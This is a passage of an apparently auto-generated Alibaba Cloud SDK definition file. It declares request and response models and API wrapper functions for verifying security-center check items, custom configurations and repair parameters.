      errorMsg?: string(name='ErrorMsg', description='Error message.', example='Custom parameter is not equal to corresponding check parameter'),
      linkErrorConfigs?: [ 
        {
          name?: string(name='Name', description='Name of the check item configuration, unique within the same check item.', example='IpLists'),
          showName?: string(name='ShowName', description='Display name of the user\\\\"s check configuration.', example='IP Lists'),
          type?: string(name='Type', description='The type of the parameter that caused the error:
- repair: Repair parameter
- custom: Custom configuration parameter', example='repair'),
        }
      ](name='LinkErrorConfigs', description='Related configurations causing this error.'),
      name?: string(name='Name', description='Name of the custom configuration item for the check item, unique within the same check item.', example='IpList'),
      type?: string(name='Type', description='Type of the erroneous parameter:
- custom: Custom configuration parameter', example='custom'),
      value?: string(name='Value', description='User-configured value string for the custom configuration item of the check item.', example='10.12.4.XX'),
    }
  ](name='ErrorCheckConfigs', description='List of check parameters with configuration errors.'),
  errorRepairConfigs?: [ 
    {
      errorCode?: string(name='ErrorCode', description='Error code.', example='ConfigEqualIllegal'),
      errorMsg?: string(name='ErrorMsg', description='Error message.', example='Repair parameter is not equal to corresponding check parameter'),
      linkErrorConfigs?: [ 
        {
          name?: string(name='Name', description='Name of the check item\\\\"s configuration, unique within the same check item.', example='IpList'),
          showName?: string(name='ShowName', description='Display name of the user\\\\"s check configuration.', example='Ip List'),
          type?: string(name='Type', description='The type of the parameter that caused the error:
- repair: Repair parameter
- custom: Custom configuration parameter', example='custom'),
        }
      ](name='LinkErrorConfigs', description='Related configurations causing this error.'),
      name?: string(name='Name', description='Name of the check item\\\\"s repair configuration, unique within the same check item.', example='IpLists'),
      type?: string(name='Type', description='The type of the parameter that caused the error:
- repair: Repair parameter', example='repair'),
      value?: string(name='Value', description='Name of the check item\\\\"s repair parameter, unique within the same check item.', example='172.26.49.XX'),
    }
  ](name='ErrorRepairConfigs', description='List of repair parameters with configuration check errors.'),
  requestId?: string(name='RequestId', description='The ID of this call request, a unique identifier generated by Alibaba Cloud for the request, which can be used for troubleshooting and problem localization.', example='7532B7EE-7CE7-5F4D-BF04-B12447DD****'),
}

model VerifyCheckCustomConfigResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: VerifyCheckCustomConfigResponseBody(name='body'),
}

/**
 * @summary Customization and validation of check items and repair parameters
 *
 * @param request VerifyCheckCustomConfigRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return VerifyCheckCustomConfigResponse
 */
async function verifyCheckCustomConfigWithOptions(request: VerifyCheckCustomConfigRequest, runtime: Util.RuntimeOptions): VerifyCheckCustomConfigResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.checkId)) {
    query['CheckId'] = request.checkId;
  }
  if (!Util.isUnset(request.customConfigs)) {
    query['CustomConfigs'] = request.customConfigs;
  }
  if (!Util.isUnset(request.repairConfigs)) {
    query['RepairConfigs'] = request.repairConfigs;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'VerifyCheckCustomConfig',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Customization and validation of check items and repair parameters
 *
 * @param request VerifyCheckCustomConfigRequest
 * @return VerifyCheckCustomConfigResponse
 */
async function verifyCheckCustomConfig(request: VerifyCheckCustomConfigRequest): VerifyCheckCustomConfigResponse {
  var runtime = new Util.RuntimeOptions{};
  return verifyCheckCustomConfigWithOptions(request, runtime);
}

model VerifyCheckInstanceResultRequest {
  checkId?: long(name='CheckId', description='The ID of the check item.

> You can call the [ListCheckResult](~~ListCheckResult~~) operation to query the IDs of check items.', example='16'),
  instanceIds?: [ string ](name='InstanceIds', description='The instance IDs of the assets on which risks are detected based on the check item.'),
}

model VerifyCheckInstanceResultResponseBody = {
  data?: {
    failInstances?: [ string ](name='FailInstances', description='An array consisting of instances that failed the check.'),
    operateCode?: string(name='OperateCode', description='The operation code of the task that checks the configurations of cloud services. Valid values:

*   **Throttling**
*   **ActionTrialUnauthorized**', example='ActionTrialUnauthorized'),
    taskId?: string(name='TaskId', description='The task ID.', example='a410bb3-e68c217a-3368bc0-238c668***'),
  }(name='Data', description='The data returned.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='B869E3A0-1147-539D-9920-47580700****'),
}

model VerifyCheckInstanceResultResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: VerifyCheckInstanceResultResponseBody(name='body'),
}

/**
 * @summary Verifies the instances on which risks are detected based on a check item.
 *
 * @param request VerifyCheckInstanceResultRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return VerifyCheckInstanceResultResponse
 */
async function verifyCheckInstanceResultWithOptions(request: VerifyCheckInstanceResultRequest, runtime: Util.RuntimeOptions): VerifyCheckInstanceResultResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.checkId)) {
    query['CheckId'] = request.checkId;
  }
  if (!Util.isUnset(request.instanceIds)) {
    query['InstanceIds'] = request.instanceIds;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'VerifyCheckInstanceResult',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Verifies the instances on which risks are detected based on a check item.
 *
 * @param request VerifyCheckInstanceResultRequest
 * @return VerifyCheckInstanceResultResponse
 */
async function verifyCheckInstanceResult(request: VerifyCheckInstanceResultRequest): VerifyCheckInstanceResultResponse {
  var runtime = new Util.RuntimeOptions{};
  return verifyCheckInstanceResultWithOptions(request, runtime);
}

model VerifyCheckResultRequest {
  checkIds?: [ long ](name='CheckIds', description='The IDs of the check items.'),
}

model VerifyCheckResultResponseBody = {
  data?: {
    operateCode?: string(name='OperateCode', description='The operation code of the cloud service configuration task. Valid values:

*   **Throttling**: frequency limit
*   **ActionTrialUnauthorized**: an error that is related to unauthorized operations', example='Throttling'),
    taskId?: string(name='TaskId', description='The task ID.', example='8eded533-5348-468c-aa1d-0aa2934a7***'),
    throttlingTimeSecond?: int32(name='ThrottlingTimeSecond', description='The throttling duration. Unit: seconds', example='1800'),
  }(name='Data', description='The data returned.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='7C0A3FA0-AA32-5660-8989-85A5582F****'),
}

model VerifyCheckResultResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: VerifyCheckResultResponseBody(name='body'),
}

/**
 * @summary Verifies risk items that are detected based on check items.
 *
 * @param request VerifyCheckResultRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return VerifyCheckResultResponse
 */
async function verifyCheckResultWithOptions(request: VerifyCheckResultRequest, runtime: Util.RuntimeOptions): VerifyCheckResultResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.checkIds)) {
    query['CheckIds'] = request.checkIds;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'VerifyCheckResult',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Verifies risk items that are detected based on check items.
 *
 * @param request VerifyCheckResultRequest
 * @return VerifyCheckResultResponse
 */
async function verifyCheckResult(request: VerifyCheckResultRequest): VerifyCheckResultResponse {
  var runtime = new Util.RuntimeOptions{};
  return verifyCheckResultWithOptions(request, runtime);
}

